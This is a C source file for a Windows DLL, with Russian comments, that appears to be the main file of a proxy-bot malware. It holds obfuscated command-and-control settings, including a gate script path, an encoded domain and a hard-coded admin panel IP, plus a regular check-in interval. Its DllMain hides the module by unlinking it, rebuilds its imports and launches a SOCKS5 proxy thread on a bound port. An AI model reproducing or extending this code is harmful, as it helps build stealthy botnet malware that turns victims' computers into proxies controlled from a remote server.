/*
	_____________ CONFIG _______________
	see bot_config.h !!!!!!!!
*/
#define CONFIG_PATH_TO_SCRIPT	"\x44\xe8\x84\x78\x80\xe8\xae\x44\x7c\x7a\xe7\x7e\x45\x83\x7b\x83" //"/socks5/gate.php"		// путь до скрипта

#define CONFIG_WEB_HOST_NAME	"\xe8\xee\x86\x86\x7e\xe9\x81\x7a\x86\x45\x7d\x82\xe9\xe8\xe7\xed\x77\xe8\x45\xe9\xee"// имя домена
#define CONFIG_IP_SERVER		"\xab\xa9\x45\xaa\xa7\xad\x45\xad\xa9\x45\xaa\xa8\xa9"	//"82.146.62.132"			// IP адрес админки

//#define CONFIG_WEB_HOST_NAME	/* 192.168.1.2  */	"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xaa\x45\xa9"
//#define CONFIG_IP_SERVER		/* 192.168.1.2 */	"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xaa\x45\xa9"

//#define CONFIG_WEB_HOST_NAME	/* 192.168.200.1  */"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xa9\x43\x43\x45\xaa"
//#define CONFIG_IP_SERVER		/* 192.168.200.1 */	"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xa9\x43\x43\x45\xaa"

//#define CONFIG_WEB_HOST_NAME	/* 10.1.1.28  */	"\xaa\x43\x45\xaa\x45\xaa\x45\xa9\xab"
//#define CONFIG_IP_SERVER		/* 10.1.1.28  */	"\xaa\x43\x45\xaa\x45\xaa\x45\xa9\xab"


#define CONFIG_PORT_RANGE_START 20000					// минимальный диапозон порта для бинда
#define CONFIG_PORT_RANGE_END	50000					// максимальный диапозон порта для бинда
#define CONFIG_KNOCK_TIME		10						// интервал в минутах когда бот будет отстукивать в админку

//#define _DEBUG_
//#define _DEBUG_SOCKET_ 

#include "bot_core.h"

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){	

	UnlinkDll(hinstDLL);

	if(g_bCreated)
		return TRUE;

	if(!ReassembleImport())
		return FALSE;
	if(!InitConfig())
		return FALSE;
	
	g_hThread = api.pOpenThread(THREAD_QUERY_INFORMATION,FALSE,g_dwThreadId);
	if(!g_hThread)
	{
		g_hThread = api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&Socks5, (LPVOID)&botOpt.uBotListenPort, 0, &g_dwThreadId);
		if(g_hThread)
			g_bCreated = TRUE;
		else
			g_bCreated = FALSE;
	}	else	{
		api.pCloseHandle(g_hThread);
	}

	return TRUE;
}
